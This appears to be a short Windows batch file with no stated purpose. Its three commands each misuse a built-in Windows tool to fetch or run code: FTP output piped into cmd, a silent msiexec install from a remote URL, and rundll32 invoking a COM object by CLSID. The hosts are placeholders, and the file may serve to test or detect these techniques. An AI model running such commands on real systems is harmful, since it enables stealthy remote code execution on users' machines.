@echo off
ftp -n ftp.example | cmd
msiexec.exe /i https://downloads.example.net/client.msi /quiet /norestart
rundll32.exe /sta {45D80231-8151-4E52-B449-719C4CB93AA1}
